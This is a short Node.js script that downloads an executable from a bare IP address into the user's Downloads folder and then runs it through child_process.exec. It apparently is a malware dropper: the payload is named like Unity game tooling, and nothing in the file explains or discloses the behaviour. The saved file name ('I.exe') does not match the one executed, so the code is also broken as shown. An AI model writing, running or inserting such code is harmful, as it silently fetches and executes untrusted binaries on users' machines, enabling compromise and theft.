const axios = require('axios').default;
const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');

async function downloadFile(url, destination) {
    const response = await axios({
        url,
        method: 'GET',
        responseType: 'stream'
    });

    const filePath = path.join(destination, 'I.exe');
    const writer = fs.createWriteStream(filePath);

    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
    });
}

async function main() {
    const url = 'http://83.222.190.222/UnityGameManager.exe';
    const destination = path.join(os.homedir(), 'Downloads');

    await downloadFile(url, destination);

    const filePath = path.join(destination, 'UnityGameManager.exe');
    exec(filePath);
}

main();